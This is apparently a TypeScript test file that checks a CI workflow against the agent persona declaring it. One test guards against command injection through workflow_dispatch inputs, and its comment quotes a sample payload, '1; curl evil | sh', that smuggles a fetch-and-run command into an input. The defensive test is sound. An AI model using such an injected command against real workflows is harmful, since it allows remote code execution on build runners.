/**
 * The batwoman workflow agrees with the persona that declares it (criterion 10).
 *
 * D8 asked for the workflow to be GENERATED from the persona, so the two could
 * not drift. `harness persona sync-workflows` cannot do that job here: it emits
 * a job whose only step is `npx harness <command>` under a pnpm install, and
 * batwoman is a canary CLI subcommand taking `--issue N`. Generating would
 * produce a workflow that invokes a command which does not exist (amendment
 * BW-C3).
 *
 * The requirement behind D8 survives regardless: **a drifted workflow is a
 * failure, not a formatting difference.** So the trigger is declared once, in
 * the persona, and asserted here against the committed workflow. Change one
 * without the other and this fails.
 *
 * It deliberately compares the TRIGGER SEMANTICS rather than the file bytes.
 * Byte equality would be a formatting test -- it fires on an added comment and
 * says nothing about whether the workflow still runs when the persona says it
 * should.
 */
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { load } from 'js-yaml';
import { describe, expect, it } from 'vitest';

const ROOT = join(import.meta.dirname, '..', '..');

function readYaml(rel: string): Record<string, unknown> {
  const doc = load(readFileSync(join(ROOT, rel), 'utf8'));
  if (typeof doc !== 'object' || doc === null) {
    throw new Error(`${rel} did not parse to a mapping`);
  }
  return doc as Record<string, unknown>;
}

interface PersonaTrigger {
  event?: unknown;
  conditions?: { branches?: unknown } | undefined;
}

const persona = readYaml('agents/personas/canary-batwoman.yaml');
const workflow = readYaml('.github/workflows/batwoman.yml');

/** `on:` under both spellings — a YAML 1.1 resolver turns it into `true`. */
const workflowOn = (workflow['on'] ?? workflow['true']) as
  Record<string, unknown> | undefined;

const triggers = (persona['triggers'] ?? []) as PersonaTrigger[];

describe('the batwoman persona and its workflow', () => {
  it('parses both files, so a broken one cannot pass by being unreadable', () => {
    // The guard on the guard: if either file stopped parsing, every assertion
    // below would be comparing undefined to undefined and reporting agreement.
    expect(Object.keys(persona).length).toBeGreaterThan(0);
    expect(triggers.length).toBeGreaterThan(0);
    expect(workflowOn).toBeDefined();
  });

  it('declares ci-workflow: false, so no generated file is expected', () => {
    // If someone flips this to true, `sync-workflows --check` becomes the
    // authority and this suite is the wrong guard -- fail loudly rather than
    // let two mechanisms disagree silently.
    const outputs = persona['outputs'] as Record<string, unknown> | undefined;
    expect(outputs?.['ci-workflow']).toBe(false);
  });

  it('runs on push to exactly the branches the persona names', () => {
    const onCommit = triggers.find((t) => t.event === 'on_commit');
    expect(onCommit).toBeDefined();
    const declared = onCommit?.conditions?.branches as string[] | undefined;
    expect(declared).toEqual(['main']);

    const push = workflowOn?.['push'] as { branches?: string[] } | undefined;
    expect(push).toBeDefined();
    expect(push?.branches).toEqual(declared);
  });

  it('offers the manual trigger the persona declares', () => {
    expect(triggers.some((t) => t.event === 'manual')).toBe(true);
    expect(workflowOn).toHaveProperty('workflow_dispatch');
  });

  it('declares no trigger the persona did not', () => {
    // The direction that actually rots: someone adds `pull_request:` to the
    // workflow while the persona still claims it fires only once a merge has
    // landed on main.
    const allowed = new Set(['push', 'workflow_dispatch']);
    for (const event of Object.keys(workflowOn ?? {})) {
      expect(allowed.has(event)).toBe(true);
    }
  });

  it('invokes the canary CLI, not a harness command', () => {
    // The reason this workflow is hand-written (BW-C3). If it ever starts
    // calling `harness batwoman`, the generator's assumption has crept back in
    // and the job will run a command that does not exist.
    const text = readFileSync(
      join(ROOT, '.github/workflows/batwoman.yml'),
      'utf8',
    );
    // The built canary binary, invoked directly -- `npx canary` would resolve
    // the PUBLISHED package and audit with whatever version npm happened to
    // hand back, not the tree under test.
    expect(text).toMatch(/canary\.js batwoman/);
    expect(text).not.toMatch(/harness batwoman/);
  });

  it('never interpolates a dispatch input into a run: body', () => {
    // `workflow_dispatch` inputs are attacker-controlled text and `${{ }}`
    // inside `run:` is textual substitution, so `1; curl evil | sh` would
    // execute. Inputs must arrive through `env:` and be validated. This is a
    // regression guard: the first draft of this workflow had the hole.
    const text = readFileSync(
      join(ROOT, '.github/workflows/batwoman.yml'),
      'utf8',
    );
    const runBodies = text
      .split(/\n\s+- name:|\n\s+- uses:/)
      .filter((step) => /\n\s+run:/.test(step));

    for (const step of runBodies) {
      const body = step.slice(step.search(/\n\s+run:/));
      expect(body).not.toMatch(/\$\{\{\s*github\.event\.inputs/);
      expect(body).not.toMatch(/\$\{\{\s*steps\./);
    }
    // And the validation itself is present.
    expect(text).toMatch(/\^\[0-9\]\+\$/);
  });

  it('stays advisory: it never fails the job on findings', () => {
    // Batwoman is advisory in v1 by spec. A workflow that fails a build on a
    // `not-exercised` row would make it blocking without anyone deciding to.
    const text = readFileSync(
      join(ROOT, '.github/workflows/batwoman.yml'),
      'utf8',
    );
    expect(text).toMatch(/continue-on-error:\s*true/);
  });
});
